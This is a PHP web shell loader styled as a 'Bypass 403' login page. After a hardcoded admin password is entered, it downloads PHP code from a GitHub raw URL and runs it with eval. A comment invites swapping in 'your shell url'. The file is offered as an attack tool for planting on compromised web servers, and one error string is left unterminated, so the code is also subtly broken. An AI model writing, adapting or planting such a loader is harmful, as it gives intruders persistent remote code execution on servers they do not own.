<?php
session_start();

$usr = 'admin'; // username
$pwd = '213377'; // password

if (isset($_SESSION['loged_in']) && $_SESSION['loged_in'] == true) {
    $url = 'https://raw.githubusercontent.com/FreedomSecurity1337/403web/main/log.txt'; // change to your shell url if u need
    $cnt = file_get_contents($url);

    if ($cnt !== false) {
        if (strpos($cnt, '<?php') !== false) {
            eval('?>' . $cnt);
        } else {
            echo "Error";
        }
    } else {
        echo "Error : failed to get shell please check your shel url";
    }
} else {
    if (isset($_POST['usr']) && isset($_POST['pwd'])) {
        $usr_in = $_POST['usr'];
        $pwd_in = $_POST['pwd'];

        if ($usr_in == $usr && $pwd_in == $pwd) {
            $_SESSION['loged_in'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $err = 'invaid hamker;
        }
    }
    ?>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login - Bypass 403</title>
        <style>
            body {
                background-color: #121212;
                font-family: 'Courier New', Courier, monospace;
                color: #00FFFF;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                overflow: hidden;
                background: url('https://raw.githubusercontent.com/FreedomSecurity1337/403web/main/200w.gif') no-repeat center center fixed;
                background-size: cover;
                animation: bgAnimation 10s infinite;
            }
            @keyframes bgAnimation {
                0% { background-position: 0 0; }
                50% { background-position: 100% 0; }
                100% { background-position: 0 0; }
            }
            .login-container {
                background: rgba(0, 0, 0, 0.7);
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
                text-align: center;
                width: 300px;
                position: relative;
                z-index: 1;
            }
            .login-container h2 {
                margin: 0;
                font-size: 28px;
                color: #00FFFF;
                animation: textGlow 1.5s infinite alternate;
            }
            @keyframes textGlow {
                0% { text-shadow: 0 0 10px #00FFFF, 0 0 20px #00FFFF, 0 0 30px #00FFFF; }
                100% { text-shadow: 0 0 20px #00FFFF, 0 0 40px #00FFFF, 0 0 60px #00FFFF; }
            }
            input[type="text"], input[type="password"] {
                width: 100%;
                padding: 10px;
                margin: 15px 0;
                border: 2px solid #00FFFF;
                border-radius: 5px;
                background-color: #121212;
                color: #00FFFF;
                font-size: 16px;
                outline: none;
                box-sizing: border-box;
            }
            input[type="submit"] {
                width: 100%;
                padding: 10px;
                background-color: #00FFFF;
                color: #121212;
                border: none;
                border-radius: 5px;
                font-size: 18px;
                cursor: pointer;
                transition: 0.3s ease;
            }
            input[type="submit"]:hover {
                background-color: #008C8C;
            }
            .error-message {
                color: red;
                font-size: 14px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Bypass 403</h2>
            <?php if (isset($err)) echo "<p class='error-message'>$err</p>"; ?>
            <form method="POST" action="">
                <label for="usr">Username:</label>
                <input type="text" id="usr" name="usr" required><br>
                <label for="pwd">Password:</label>
                <input type="password" id="pwd" name="pwd" required><br>
                <input type="submit" value="Login">
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}
?>
